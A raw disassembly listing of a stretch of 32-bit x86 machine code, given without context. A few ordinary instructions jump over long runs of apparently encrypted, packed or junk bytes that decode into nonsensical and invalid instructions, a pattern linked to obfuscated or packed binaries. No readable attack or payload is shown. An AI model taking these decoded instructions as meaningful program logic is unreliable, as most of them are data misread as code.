  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0x70cfddae
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [edi],ah
  4128b3:	push   eax
  4128b4:	cmc    
  4128b5:	xor    BYTE PTR [ecx-0x3b6b3d51],cl
  4128bb:	cmp    DWORD PTR ds:0x3ec29e97,edi
  4128c1:	mov    edx,0xc15589c8
  4128c6:	jbe    0x412936
  4128c8:	lds    edi,FWORD PTR [ecx+eax*1]
  4128cb:	mov    ds:0xdcbcb4f8,eax
  4128d0:	cli    
  4128d1:	xor    al,0x78
  4128d3:	jmp    0x4128b0
  4128d5:	sub    ah,BYTE PTR [esi+0x15d56cb9]
  4128db:	mov    dh,0xc7
  4128dd:	rcl    cl,cl
  4128df:	mov    eax,0x1bdf7498
  4128e4:	fwait
  4128e5:	inc    ecx
  4128e6:	and    eax,0x1bba8781
  4128eb:	push   0xffffffbe
  4128ed:	aas    
  4128ee:	lock sbb eax,0xba3c3a98
  4128f4:	sub    eax,0x6d38424c
  4128f9:	push   esi
  4128fa:	in     al,dx
  4128fb:	and    bh,cl
  4128fd:	dec    esp
  4128fe:	sub    ch,BYTE PTR [esi+0x7aadbd58]
  412904:	mov    ebp,0x2c0ba337
  412909:	push   esi
  41290a:	jl     0x41296b
  41290c:	sub    eax,0xcc3870e0
  412911:	sub    edx,DWORD PTR [ecx-0x1434aa29]
  412917:	test   DWORD PTR [ecx+0x16eea41b],ecx
  41291d:	cdq    
  41291e:	sbb    esi,edx
  412920:	in     eax,0x65
  412922:	mov    dl,0x2d
  412924:	and    al,BYTE PTR [edx+0x78]
  412927:	stc    
  412928:	pop    ebx
  412929:	and    al,0xc7
  41292c:	ror    DWORD PTR [edi+eiz*8],cl
  41292f:	loopne 0x4128df
  412931:	inc    edi
  412932:	add    BYTE PTR [ebp-0x46],bl
  412935:	into   
  412936:	repnz in eax,dx
  412938:	inc    ecx
  412939:	sbb    ebx,edi
  41293b:	sub    ecx,DWORD PTR [ebx-0x78a5a173]
  412941:	mov    eax,ds:0x76331ffb
  412946:	xor    BYTE PTR [ecx+ebx*2],ch
  412949:	in     al,0x56
  41294b:	lods   eax,DWORD PTR ds:[esi]
  41294c:	adc    BYTE PTR [ebx+0x2427417e],0x85
  412953:	das    
  412954:	arpl   WORD PTR [ebx+0x41],dx
  412957:	shl    DWORD PTR [edi],0x54
  41295a:	test   eax,0xe387e6e8
  41295f:	push   0x4a
  412961:	mov    dh,0x8f
  412963:	mov    eax,ds:0x1ee571d0
  412968:	sub    DWORD PTR [eax],edx
  41296a:	in     eax,dx
  41296b:	aam    0x8e
  41296d:	xor    eax,0xe1694189
  412972:	sbb    BYTE PTR [ebx-0x21],bl
  412975:	gs pop esi
  412977:	inc    bx
  412979:	out    dx,eax
  41297a:	dec    esi
  41297b:	data16 add BYTE PTR [edi-0x3f],bh
  41297f:	iret   
  412980:	add    esp,DWORD PTR [edx+0x8]
  412983:	outs   dx,BYTE PTR ds:[esi]
  412984:	icebp  
  412985:	and    DWORD PTR [edx],edx
  412987:	stc    
  412988:	sbb    bh,0x98
  41298b:	shr    DWORD PTR [edi],cl
  41298d:	fyl2x  
  41298f:	lods   eax,DWORD PTR ds:[esi]
  412990:	(bad)  
  412991:	push   0x119899e1
  412996:	leave  
  412997:	loop   0x412940
  412999:	jns    0x41291f
  41299b:	xor    eax,0xde8691af
  4129a0:	sti    
  4129a1:	inc    eax
  4129a2:	inc    ebx
  4129a3:	cmp    edx,eax
  4129a5:	mov    DWORD PTR [edi],ebp
  4129a7:	mov    cs,WORD PTR [edi-0x2d16912e]
  4129ad:	stos   BYTE PTR es:[edi],al
  4129ae:	sub    eax,0x4dc31516
  4129b3:	push   ss
  4129b4:	push   esp
  4129b5:	mov    edi,DWORD PTR [edx]
  4129b7:	es in  al,dx
  4129b9:	xchg   esp,eax
  4129ba:	jae    0x412978
  4129bc:	icebp  
  4129bd:	mov    eax,ds:0x9846fd58
  4129c2:	(bad)  
  4129c3:	lods   eax,DWORD PTR ds:[esi]
  4129c4:	xor    ebp,ebp
  4129c6:	retf   
  4129c7:	fs rcl edi,0x4a
  4129cb:	adc    ecx,DWORD PTR [eax]
  4129cd:	ss in  al,0xbc
  4129d0:	addr16 cld 
  4129d2:	stos   DWORD PTR es:[edi],eax
  4129d3:	push   ebp
  4129d4:	mov    eax,0x867b1165
  4129d9:	xor    eax,0x19b26429
  4129de:	xchg   edx,eax
  4129df:	jae    0x412a26
  4129e1:	push   ecx
  4129e2:	ret    0xf4e9
  4129e5:	fcomp  QWORD PTR [eax]
  4129e7:	out    dx,al
  4129e8:	and    bh,BYTE PTR [ebx+0xb]
  4129eb:	in     al,0x96
  4129ed:	mov    ch,0xb9
  4129ef:	std    
  4129f0:	xchg   esp,eax
  4129f1:	cmc    
  4129f2:	ftst   
  4129f4:	adc    eax,ebx
  4129f6:	push   0xffffffdf
  4129f8:	sbb    BYTE PTR [ebp+0x57],cl
  4129fb:	scas   eax,DWORD PTR es:[edi]
  4129fc:	bnd jmp 0x887f5212
  412a02:	push   0xffffffa7
  412a04:	cmp    BYTE PTR [eax+0x1c],0x38
  412a08:	push   eax
  412a09:	xor    eax,0x1cdb57eb
  412a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a0f:	mov    ebp,0x3a416f95
  412a14:	add    bh,BYTE PTR [edx+0x3a]
  412a17:	push   ebp
  412a18:	cmp    BYTE PTR [edi+0x4da4d202],cl
  412a1e:	stos   DWORD PTR es:[edi],eax
  412a1f:	repnz stc 
  412a21:	retf   
  412a22:	mov    ch,0x3d
  412a24:	xlat   BYTE PTR ds:[ebx]
  412a25:	push   ebx
  412a26:	sbb    edi,ebp
  412a28:	cmp    al,bh
  412a2a:	jno    0x4129be
  412a2c:	pcmpeqb mm5,mm4
  412a2f:	ins    BYTE PTR es:[edi],dx
  412a30:	lock sbb ch,BYTE PTR [edx-0x42029a57]
  412a37:	std    
  412a38:	or     al,0xbb
  412a3a:	push   eax
  412a3b:	add    ecx,DWORD PTR [ebx]
  412a3d:	mov    DWORD PTR [eax],esi
  412a3f:	adc    ecx,DWORD PTR [ebx+0x1b]
  412a42:	sub    dl,bh
  412a44:	out    0x90,eax
  412a46:	pop    edx
  412a47:	in     eax,dx
  412a48:	adc    al,0xa7
  412a4a:	dec    ebp
  412a4b:	nop
  412a4c:	dec    ebp
  412a4d:	fisttp QWORD PTR [edi-0x3f2fe16c]
  412a53:	sbb    al,0xff
  412a55:	xor    DWORD PTR [ebx-0xe],edi
  412a58:	aas    
  412a59:	push   eax
  412a5a:	mov    al,ds:0x2d8c8fb8
  412a5f:	retf   0x7388
  412a62:	dec    ecx
  412a63:	sahf   
  412a64:	pop    eax
  412a65:	in     eax,0x35
  412a67:	push   ss
  412a68:	outs   dx,DWORD PTR ds:[esi]
  412a69:	cmp    eax,0x99e7244a
  412a6e:	pusha  
  412a6f:	inc    ecx
  412a70:	std    
  412a71:	and    eax,0x93d179a
  412a76:	outs   dx,DWORD PTR ds:[esi]
  412a77:	push   ecx
  412a78:	and    ebx,edi
  412a7a:	retf   
  412a7b:	pop    ss
  412a7c:	sbb    eax,ecx
  412a7e:	adc    bh,ah
  412a80:	push   es
  412a81:	xchg   BYTE PTR [edx],ch
  412a83:	mov    ebx,0x77130043
  412a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a89:	add    dh,BYTE PTR [ecx+edi*1]
  412a8c:	test   BYTE PTR [edi-0x3fec75c5],al
  412a92:	push   eax
  412a93:	bound  edx,QWORD PTR ss:[ecx]
  412a96:	inc    edi
  412a97:	bound  esi,QWORD PTR [eax+ecx*2+0x7924f178]
  412a9e:	int3   
  412a9f:	aam    0xeb
  412aa1:	mov    dl,0xec
  412aa3:	mov    edi,0x4fdfaef4
  412aa8:	in     al,0x67
  412aaa:	mov    edx,0xa8c7285
  412aaf:	aam    0x87
  412ab1:	push   esp
  412ab2:	xchg   BYTE PTR [edx],cl
  412ab4:	dec    edi
  412ab5:	shr    ch,0x3
  412ab8:	add    al,0xb1
  412aba:	sbb    al,0x80
  412abc:	repz pusha 
  412abe:	scas   eax,DWORD PTR es:[edi]
  412abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ac0:	mov    ch,0x3e
  412ac2:	pop    ecx
  412ac3:	sbb    al,0xf1
  412ac5:	xor    al,0x4
  412ac7:	pop    ds
  412ac8:	xchg   edi,eax
  412ac9:	gs inc edx
  412acb:	xor    BYTE PTR [edx+eiz*8+0x4a5b001c],0xbd
  412ad3:	out    0xb1,al
  412ad5:	in     eax,dx
  412ad6:	or     BYTE PTR [ebp+0x43e982ad],dl
  412adc:	ret    0xea1b
  412adf:	pop    ss
  412ae0:	out    0x5f,eax
  412ae2:	shr    DWORD PTR [esi+ebp*4-0x2a94afa],cl
  412ae9:	dec    edx
  412aea:	or     BYTE PTR [edi],dh
  412aec:	jno    0x412a77
  412aee:	mov    eax,ds:0xe4e033a5
  412af3:	(bad)  
  412af4:	jb     0x412ab4
  412af6:	sbb    esi,DWORD PTR [ebx-0x1498004b]
  412afc:	mov    eax,0x1c80ce79
  412b01:	dec    eax
  412b02:	pop    ebp
  412b03:	retf   0x21d2
  412b06:	mov    ebx,0x6f799720
  412b0b:	inc    ebp
  412b0c:	add    al,0x37
  412b0e:	xor    eax,0x962a313a
  412b13:	jne    0x412ab6
  412b15:	ss stos BYTE PTR es:[edi],al
  412b17:	dec    eax
  412b18:	xor    ch,bl
  412b1a:	inc    esp
  412b1b:	cwde   
  412b1c:	shl    DWORD PTR [ebx],1
  412b1e:	test   DWORD PTR ds:0xdbd4c72e,esp
  412b24:	sbb    al,0x2e
  412b26:	data16 jl 0x412ac1
  412b29:	das    
  412b2a:	aam    0x72
  412b2c:	jle    0x412b85
  412b2e:	mov    al,0x1d
  412b30:	cmc    
  412b31:	fbstp  TBYTE PTR [ebp+0x41831a07]
  412b37:	(bad)
  412b3a:	and    BYTE PTR [ecx+0x61],dl
  412b3d:	add    edi,DWORD PTR [ecx+0x45]
  412b40:	(bad)
  412b43:	cmp    ebp,esp
  412b45:	mov    edi,0xb1405cf8
  412b4a:	(bad)  
  412b4b:	in     eax,dx
  412b4c:	in     al,dx
  412b4d:	sub    ch,BYTE PTR [edi+0x63c1f826]
  412b53:	pop    ebp
  412b54:	enter  0xfd34,0x41
  412b58:	and    al,0xbe
  412b5a:	lds    edx,FWORD PTR [edi+ebp*2+0xd94c505]
  412b61:	and    BYTE PTR [eax+ecx*4],bh
  412b64:	stc    
  412b65:	pop    edx
  412b66:	push   edi
  412b67:	imul   esp,DWORD PTR [edi+eax*2-0x615ac922],0x132dcce8
  412b72:	pop    edx
  412b73:	stos   DWORD PTR es:[edi],eax
  412b74:	psllw  mm0,QWORD PTR [ecx+0x6ba8ec96]
  412b7b:	inc    ebp
  412b7c:	loope  0x412b70
  412b7e:	daa    
  412b7f:	repz retf 0x965f
  412b83:	xchg   BYTE PTR es:[edi+0xa],cl
  412b87:	rol    BYTE PTR [eax-0x6f7475b6],cl
  412b8d:	bound  ebp,QWORD PTR [ebx]
  412b8f:	xchg   edx,eax
  412b90:	(bad)  
  412b92:	enter  0x6d9a,0x3e
  412b96:	retf   0xa21b
  412b99:	xchg   edx,eax
  412b9a:	sahf   
  412b9b:	aam    0x51
  412b9d:	bound  edi,QWORD PTR [ecx]
  412b9f:	test   al,0xc5
  412ba1:	xchg   edi,eax
  412ba2:	pop    edx
  412ba3:	dec    ecx
  412ba4:	mov    ds:0x1e035a90,al
  412ba9:	out    0xac,al
  412bab:	and    esi,edx
  412bad:	xchg   ebp,eax
  412bae:	jns    0x412b69
  412bb0:	xor    BYTE PTR [ebx+0xc],dl
  412bb3:	popf   
  412bb4:	test   BYTE PTR [edi+0x9e7e5ec],dl
  412bba:	loop   0x412b4f
  412bbc:	sbb    al,bl
  412bbe:	dec    edi
  412bbf:	xchg   edx,eax
  412bc0:	sti    
  412bc1:	fnstenv [ebp+0x42395ea0]
  412bc7:	pop    ecx
  412bc8:	sahf   
  412bc9:	cmp    ah,al
  412bcb:	cmp    al,0xcd
  412bcd:	sbb    ah,dh
  412bcf:	xchg   esp,eax
  412bd0:	sub    BYTE PTR [ebp-0x484141b8],al
  412bd6:	and    eax,0xabd95add
  412bdb:	xchg   ebp,eax
  412bdc:	daa    
  412bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bde:	and    ebx,edi
  412be0:	daa    
  412be1:	push   0x3926fd64
  412be6:	mov    ebp,0xd2d72995
  412beb:	aam    0x69
  412bed:	push   esi
  412bee:	or     bl,BYTE PTR [eax-0x404cfcb6]
  412bf4:	push   edx
  412bf5:	xor    cl,dh
  412bf7:	sub    dl,BYTE PTR [ebx+0x580708a1]
  412bfd:	xor    edx,DWORD PTR [eax+0x37]
  412c00:	in     al,0xf5
  412c02:	loope  0x412c47
  412c04:	ja     0x412c40
  412c06:	sahf   
  412c07:	fmul   st,st(6)
  412c09:	int    0xe
  412c0b:	in     al,dx
  412c0c:	mov    WORD PTR [ebx-0x3228434d],gs
  412c12:	(bad)  
  412c13:	lahf   
  412c14:	scas   al,BYTE PTR es:[edi]
  412c15:	nop
  412c16:	xchg   BYTE PTR [esi-0xfe2d3a6],al
  412c1c:	push   cs
  412c1d:	in     eax,dx
  412c1e:	leave  
  412c1f:	loopne 0x412bb1
  412c21:	shr    DWORD PTR [ecx-0x48ca9dac],1
  412c27:	test   eax,0xb9a52612
  412c2c:	mov    bh,0xf5
  412c2e:	and    ch,BYTE PTR [ecx-0x1d]
  412c31:	sbb    al,0x2c
  412c33:	push   0xac68fff7
  412c38:	sub    al,0xa0
  412c3a:	jno    0x412c73
  412c3c:	mov    ah,0x26
  412c3e:	rcr    DWORD PTR [esp+eax*8+0x6d4ffc1a],0x2b
  412c46:	test   eax,0xd74cd443
  412c4b:	add    eax,0xb94d97b
  412c50:	(bad)  
  412c51:	fimul  DWORD PTR [esi+0x4f]
  412c54:	push   ss
  412c55:	sbb    DWORD PTR [edx+0x77ea27a6],0xffffff9e
  412c5c:	pop    ebx
  412c5d:	mov    esi,0x69718d46
  412c62:	retf   0xd881
  412c65:	dec    esi
  412c66:	jle    0x412cdb
  412c68:	lods   eax,DWORD PTR ds:[esi]
  412c69:	or     bl,BYTE PTR [esi+0x70]
  412c6c:	jecxz  0x412bf9
  412c6e:	inc    ebp
  412c6f:	clc    
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0x7cb5cb63
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [esi+0x7be07c12],dl
  412cb2:	pxor   xmm0,XMMWORD PTR [esi+0x2be3dd62]
  412cba:	ret    0x50d1
  412cbd:	pop    ebx
  412cbe:	push   ecx
  412cbf:	aad    0xf3
  412cc1:	pop    edx
  412cc2:	and    dh,cl
  412cc4:	cli    
  412cc5:	call   0x7be7accd
  412cca:	retf   0xfdba
  412ccd:	lea    esp,[edx]
  412ccf:	inc    edi
  412cd0:	inc    esp
  412cd1:	scas   eax,DWORD PTR es:[edi]
  412cd2:	xchg   ah,bh
  412cd4:	in     al,0x64
  412cd6:	add    esi,DWORD PTR [eax+0x3f]
  412cd9:	push   ss
  412cda:	ins    BYTE PTR es:[edi],dx
  412cdb:	clc    
  412cdc:	xor    al,0xae
  412cde:	xor    BYTE PTR [ebp+0x76],ch
  412ce1:	xchg   BYTE PTR [edx+eiz*2-0x27],ah
  412ce5:	pop    ss
  412ce6:	fcmovnb st,st(7)
  412ce8:	shl    BYTE PTR [edi],1
  412cea:	movd   mm3,DWORD PTR [ebx-0x35]
  412cee:	leave  
  412cef:	or     dh,BYTE PTR ds:0x2f1a14d
  412cf5:	call   FWORD PTR [esi]
  412cf7:	in     al,0xa7
  412cf9:	or     al,BYTE PTR [ebp-0x307615ed]
  412cff:	adc    al,0xd
  412d01:	add    ecx,DWORD PTR [edx+0x30]
  412d04:	(bad)  
  412d05:	sub    esp,DWORD PTR [ecx]
  412d07:	repz repnz pop ecx
  412d0a:	pop    edx
  412d0b:	lds    esp,FWORD PTR [ebp+0x15]
  412d0e:	fdiv   DWORD PTR [edi]
  412d10:	sbb    al,0x54
  412d12:	repnz hlt 
  412d14:	mov    ecx,0x3d69aeaf
  412d19:	out    dx,al
  412d1a:	push   eax
  412d1b:	pop    edx
  412d1c:	dec    edi
  412d1d:	jbe    0x412d26
  412d1f:	push   ebp
  412d20:	cdq    
  412d21:	jmp    0x897e:0xafe85324
  412d28:	and    BYTE PTR [esp+edi*8],ch
  412d2b:	mov    edi,0x79d538d3
  412d30:	pop    edx
  412d31:	xchg   ebx,eax
  412d32:	add    esi,esi
  412d34:	or     edx,DWORD PTR [eax]
  412d36:	cmp    bl,BYTE PTR [edx-0x51339bb9]
  412d3c:	cmc    
  412d3d:	xchg   DWORD PTR [esi-0x10],ebx
  412d40:	xacquire xchg DWORD PTR [eax+0x132248b4],edi
  412d47:	rcl    DWORD PTR [edi+0x53],1
  412d4a:	daa    
  412d4b:	push   esi
  412d4c:	dec    esi
  412d4d:	and    ebx,DWORD PTR [eax+0x4825035d]
  412d53:	mov    ds:0x74b8d754,al
  412d58:	fwait
  412d59:	add    edi,ebx
  412d5b:	xor    ecx,0x5ad1fcc2
  412d61:	mov    al,0x5d
  412d63:	cmp    DWORD PTR [ebp+edx*8-0x6e539167],ecx
  412d6a:	push   ebx
  412d6b:	stos   BYTE PTR es:[edi],al
  412d6c:	push   ebp
  412d6d:	je     0x412d40
  412d6f:	aam    0x16
  412d71:	cld    
  412d72:	int3   
  412d73:	test   eax,0x29f40c6e
  412d78:	jbe    0x412d12
  412d7a:	adc    bl,bl
  412d7c:	mov    al,ds:0x9dcb9fdf
  412d81:	shl    BYTE PTR [ecx+0x21bffc49],1
  412d87:	mov    bl,0x7a
  412d89:	sbb    al,0xc2
  412d8b:	das    
  412d8c:	stc    
  412d8d:	xchg   esi,eax
  412d8e:	stos   BYTE PTR es:[edi],al
  412d8f:	(bad)  
  412d90:	mov    esp,0x4f304a31
  412d95:	(bad)  
  412d96:	out    0xbe,al
  412d98:	push   edi
  412d99:	bound  ebp,QWORD PTR [edx]
  412d9b:	mov    bh,bl
  412d9d:	in     al,0x93
  412d9f:	push   ebx
  412da0:	dec    eax
  412da1:	add    DWORD PTR [ebp+0x79],esp
  412da4:	or     BYTE PTR [ebx-0x1],ah
  412da7:	mov    al,ds:0x6a0e2cd
  412dac:	sbb    bh,0x48
  412daf:	or     DWORD PTR [eax+0x3b],esp
  412db2:	das    
  412db3:	pop    edx
  412db4:	aaa    
  412db5:	xor    bh,0x15
  412db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db9:	sbb    BYTE PTR [eax+0x3c4b86af],0x96
  412dc0:	test   DWORD PTR [esi+0x8be5aeb],0x5a4ef23a
  412dca:	(bad)  
  412dcb:	lock test BYTE PTR [ebx],0x1d
  412dcf:	enter  0xeb5,0xce
  412dd3:	sub    bh,dl
  412dd5:	sti    
  412dd6:	and    DWORD PTR [esi+0x5faeef24],ebp
  412ddc:	push   edx
  412ddd:	or     BYTE PTR [ecx-0x305fb45b],cl
  412de3:	enter  0xb674,0x78
  412de7:	mov    esi,0xdc67c592
  412dec:	pop    ebp
  412ded:	aam    0x6d
  412def:	cdq    
  412df0:	enter  0xaff6,0xda
  412df4:	xchg   esi,eax
  412df5:	pop    ebx
  412df6:	arpl   WORD PTR [edx-0x454aad09],ax
  412dfc:	inc    edi
  412dfd:	pop    eax
  412dfe:	in     eax,dx
  412dff:	jle    0x412e15
  412e01:	sbb    cl,BYTE PTR [edx]
  412e03:	pop    edx
  412e04:	sub    BYTE PTR [ebp+0x2b],dl
  412e07:	loop   0x412da3
  412e09:	inc    esi
  412e0a:	shr    DWORD PTR [esi-0x80],0x1d
  412e0e:	jno    0x412de2
  412e10:	adc    eax,0x9e6779fc
  412e15:	jmp    0x3acd:0xd11ca85c
  412e1c:	pusha  
  412e1d:	call   0x8094c50d
  412e22:	push   edi
  412e23:	fcom   QWORD PTR [ecx-0x5a]
  412e26:	cli    
  412e27:	and    eax,0xc1983381
  412e2c:	stc    
  412e2d:	push   ebp
  412e2e:	xchg   esp,eax
  412e2f:	push   ds
  412e30:	adc    eax,0x55a78ecd
  412e35:	fidiv  WORD PTR [eax+0x53]
  412e38:	jne    0x412eaf
  412e3a:	mov    DWORD PTR [ebx],esi
  412e3c:	lea    ebx,[ebx-0x2a63cad8]
  412e42:	mov    ecx,0xb8160654
  412e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e48:	nop
  412e49:	add    al,0x90
  412e4b:	js     0x412eac
  412e4d:	mov    eax,ds:0xefc95d31
  412e52:	jl     0x412e0b
  412e54:	rcl    BYTE PTR [eax-0x220e2060],cl
  412e5a:	sub    DWORD PTR [edx],0xffffffbc
  412e5d:	rcl    ecx,cl
  412e5f:	cmp    ah,BYTE PTR [ebp+0x3d]
  412e62:	dec    esp
  412e63:	fwait
  412e64:	jae    0x412e3f
  412e66:	jl     0x412ec5
  412e68:	jne    0x412e2c
  412e6a:	inc    ebx
  412e6b:	pop    ebp
  412e6c:	jmp    0xdc01:0x9cb45071
  412e73:	imul   esp,ebp,0xd1d5bcfb
  412e79:	sub    DWORD PTR [eax],ebp
  412e7b:	es push ebp
  412e7d:	fs call 0xfe405e38
  412e83:	lds    ebp,FWORD PTR [ebx-0x23]
  412e86:	and    BYTE PTR [eax],ch
  412e88:	or     al,0x8c
  412e8a:	aad    0xba
  412e8c:	retf   
  412e8d:	xor    BYTE PTR [ecx],dl
  412e8f:	retf   0x77ff
  412e92:	les    edx,FWORD PTR [ebx+eax*2]
  412e95:	pop    ds
  412e96:	xchg   edi,eax
  412e97:	arpl   dx,bp
  412e99:	mov    eax,0x3a922a93
  412e9e:	or     DWORD PTR ds:0xf2b255d6,edx
  412ea4:	inc    edx
  412ea5:	inc    esp
  412ea6:	inc    edx
  412ea7:	mov    ch,0x1b
  412ea9:	mov    ch,dh
  412eab:	mov    ecx,0xea0b7e42
  412eb0:	cld    
  412eb1:	mov    dl,0x17
  412eb3:	mov    bl,ch
  412eb5:	inc    BYTE PTR [edi-0x5399c0a4]
  412ebb:	xor    al,al
  412ebd:	call   0xda85fad3
  412ec2:	or     DWORD PTR [ebp+esi*8-0x6c295645],edi
  412ec9:	push   esp
  412eca:	push   esp
  412ecb:	out    dx,eax
  412ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ecd:	adc    DWORD PTR [edi-0x33bdb5da],esp
  412ed3:	fcom   st(2)
  412ed5:	(bad)  
  412ed6:	adc    BYTE PTR [esi],ch
  412ed8:	aam    0x59
  412eda:	mov    dl,0xbf
  412edc:	mov    edx,0x87779811
  412ee1:	cdq    
  412ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ee3:	lods   eax,DWORD PTR ds:[esi]
  412ee4:	inc    ebp
  412ee5:	push   ecx
  412ee6:	xchg   edx,eax
  412ee7:	mov    dl,dl
  412ee9:	jl     0x412f2a
  412eeb:	sbb    DWORD PTR [ecx],ebx
  412eed:	int    0xff
  412eef:	stos   DWORD PTR es:[edi],eax
  412ef0:	popf   
  412ef1:	lea    ebx,[ebp+0x20]
  412ef4:	cdq    
  412ef5:	jns    0x412ee0
  412ef7:	clc    
  412ef8:	or     edi,DWORD PTR [edx+0x22]
  412efb:	inc    edx
  412efc:	fwait
  412efd:	hlt    
  412efe:	(bad)  
  412eff:	fld    QWORD PTR [edi-0x3f]
  412f02:	inc    edi
  412f03:	movntps XMMWORD PTR [eax-0x66fc91e2],xmm1
  412f0a:	aas    
  412f0b:	sub    eax,0xa478603a
  412f10:	add    eax,0xea5fba4e
  412f15:	aad    0xa7
  412f17:	mov    esi,0x90d0e597
  412f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f1d:	xchg   BYTE PTR [eax],dl
  412f1f:	mov    dh,0x4a
  412f21:	xor    edi,edx
  412f23:	loop   0x412f37
  412f25:	inc    ebp
  412f26:	or     esp,DWORD PTR [edi+0x689da6cb]
  412f2c:	es jl  0x412ece
  412f2f:	push   edi
  412f30:	jae    0x412f6c
  412f32:	mov    dh,0xa9
  412f34:	inc    ebx
  412f35:	sub    DWORD PTR [edi],eax
  412f37:	xor    eax,0x11603960
  412f3c:	fwait
  412f3d:	xchg   edx,eax
  412f3e:	jle    0x412f90
  412f40:	data16 add al,0x30
  412f43:	in     al,dx
  412f44:	cmp    DWORD PTR [ecx-0x75],0x35
  412f48:	adc    BYTE PTR [ebp+0xc033104],dl
  412f4e:	adc    BYTE PTR [ecx],ch
  412f50:	sbb    esi,eax
  412f52:	pop    esi
  412f53:	push   ebx
  412f54:	and    eax,0xb7165053
  412f59:	sub    BYTE PTR [eax],dh
  412f5b:	jmp    FWORD PTR ds:0xcd1884a9
  412f61:	push   ebx
  412f62:	push   0x549891d7
  412f67:	add    al,0xc0
  412f69:	xchg   ah,dl
  412f6b:	cwde   
  412f6c:	imul   eax,DWORD PTR [ebx+0x64bdcfed],0x6d
  412f73:	pop    eax
  412f74:	xor    BYTE PTR [ecx],bh
  412f76:	pop    eax
  412f77:	mov    ebx,0x8106c5e7
  412f7c:	(bad)  
  412f7d:	xor    ah,BYTE PTR [eax]
  412f7f:	test   BYTE PTR [ebx],0xac
  412f82:	ret    
  412f83:	pusha  
  412f84:	pop    edx
  412f85:	ds adc al,0xf0
  412f88:	lods   eax,DWORD PTR ds:[esi]
  412f89:	xchg   edi,eax
  412f8a:	mov    eax,ds:0x8a8b87da
  412f8f:	lods   eax,DWORD PTR ds:[esi]
  412f90:	shr    bh,0x5
  412f93:	pop    es
  412f94:	cmp    BYTE PTR [edi-0x70b7e22a],ah
  412f9a:	scas   eax,DWORD PTR es:[edi]
  412f9b:	mov    ds:0x4b7e2419,al
  412fa0:	mov    al,ds:0x1f09942d
  412fa5:	sar    al,cl
  412fa7:	shl    DWORD PTR [edx],1
  412fa9:	lds    esi,FWORD PTR [ebp+ebx*8+0x3699aeff]
  412fb0:	push   0xe9d5e949
  412fb5:	shr    DWORD PTR [ebx-0x5f],0x89
  412fb9:	push   ebx
  412fba:	sbb    DWORD PTR [esp+edi*4+0x648ba59],ecx
  412fc1:	mov    esp,0xea315dc5
  412fc6:	ret    0xe1ce
  412fc9:	pushf  
  412fca:	mov    dh,0xb1
  412fcc:	aam    0xca
  412fce:	aas    
  412fcf:	out    dx,al
  412fd0:	(bad)  
  412fd1:	scas   al,BYTE PTR es:[edi]
  412fd2:	cmp    ebp,DWORD PTR [eax+0x4d]
  412fd5:	inc    esi
  412fd6:	pop    ecx
  412fd7:	jmp    edi
  412fd9:	mov    ah,0x1a
  412fdb:	(bad)  
  412fdc:	bts    DWORD PTR ds:0x8d3eb409,edi
  412fe3:	cwde   
  412fe4:	push   edx
  412fe5:	add    dl,BYTE PTR [ecx+0x6689237b]
  412feb:	mov    ebp,0xe9cd0e09
  412ff1:	dec    ebp
  412ff2:	jno    0x412fe2
  412ff4:	inc    edx
  412ff5:	les    esp,FWORD PTR [eax+edi*8]
  412ff8:	pop    ebp
  412ff9:	xchg   esp,eax
  412ffa:	frstor [edi+0x62]
  412ffd:	jno    0x413068
  412fff:	jg     0x41304d
  413001:	in     al,0x3a
  413003:	adc    BYTE PTR [ebp+0x60],al
  413006:	xchg   esp,eax
  413007:	popa   
  413008:	sub    ebp,DWORD PTR [eax+ebx*8]
  41300b:	inc    edi
  41300c:	mov    ebp,0xdfdd9cf3
  413011:	inc    eax
  413012:	cld    
  413013:	mov    dh,dl
  413015:	xchg   esi,eax
  413016:	mov    esp,0x5d07c552
  41301b:	mov    ah,0xe0
  41301d:	sub    ch,BYTE PTR [edi+ebx*1-0x1141538a]
  413024:	popa   
  413025:	mov    edi,ebx
  413027:	(bad)  
  413028:	pushf  
  413029:	ins    BYTE PTR es:[edi],dx
  41302a:	jmp    0xe6ccda1f
  41302f:	dec    edx
  413030:	jne    0x413018
  413032:	inc    BYTE PTR [edx+0x78]
  413035:	inc    ecx
  413036:	fwait
  413037:	lea    edi,[ebx+0x685fa341]
  41303d:	inc    esp
  41303e:	(bad)  
  413040:	cmp    DWORD PTR [ecx],ebp
  413042:	push   eax
  413043:	aad    0xeb
  413045:	jo     0x41306f
  413047:	adc    DWORD PTR [edi-0x6bc2ff7f],edi
  41304d:	push   ss
  41304e:	fbld   TBYTE PTR [ebx-0xb]
  413051:	jns    0x41301f
